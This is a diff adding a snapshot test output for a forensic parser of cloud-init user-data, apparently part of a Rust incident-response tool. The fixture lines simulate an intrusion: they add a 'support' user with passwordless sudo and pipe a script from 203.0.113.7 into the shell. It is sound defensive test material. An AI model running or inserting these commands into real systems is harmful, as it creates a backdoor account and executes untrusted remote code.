@@ -1,0 +1,9 @@
+---
+source: crates/nixcavate-artifacts/src/linux/cloud_init.rs
+expression: out
+---
+{"host":"memory","artifact":"cloud-init-user-data","source_path":"var/lib/cloud/instances/iid-1/user-data.txt","source_line":1,"kind":"user-data","text":"#!/bin/bash"}
+{"host":"memory","artifact":"cloud-init-user-data","source_path":"var/lib/cloud/instances/iid-1/user-data.txt","source_line":2,"kind":"user-data","text":"# first boot"}
+{"host":"memory","artifact":"cloud-init-user-data","source_path":"var/lib/cloud/instances/iid-1/user-data.txt","source_line":3,"kind":"user-data","text":"useradd -m -s /bin/bash support"}
+{"host":"memory","artifact":"cloud-init-user-data","source_path":"var/lib/cloud/instances/iid-1/user-data.txt","source_line":4,"kind":"user-data","text":"echo \"support ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/90-support"}
+{"host":"memory","artifact":"cloud-init-user-data","source_path":"var/lib/cloud/instances/iid-1/user-data.txt","source_line":5,"kind":"user-data","text":"curl -s http://203.0.113.7/x.sh | sh"}
